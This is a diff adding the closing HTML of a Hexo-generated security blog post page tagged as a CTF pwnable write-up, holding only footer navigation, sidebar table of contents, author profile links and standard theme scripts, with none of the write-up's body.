+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/pwnable/" rel="tag"># pwnable</a>
+              <a href="/tags/write-up/" rel="tag"># write-up</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/24/2021-05-25-Clop/" rel="prev" title="Clop Ransomware">
+      <i class="fa fa-chevron-left"></i> Clop Ransomware
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#chunk-manager"><span class="nav-number">1.</span> <span class="nav-text">chunk_manager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#string-manger"><span class="nav-number">2.</span> <span class="nav-text">string manger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#am"><span class="nav-number">3.</span> <span class="nav-text">am</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rvkhun" src="/images/raccoon1.jpg">
+  <p class="site-author-name" itemprop="name">rvkhun</p>
+  <div class="site-description" itemprop="description">Security Researcher / CTF Player</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:pwnkidhn@gmail.com" title="E-Mail → mailto:pwnkidhn@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/" title="YouTube → https:&#x2F;&#x2F;youtube.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-youtube"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://instagram.com/_choizy_" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;_choizy_" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-instagram"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rvkhun</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Gemini</a>
+  </div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
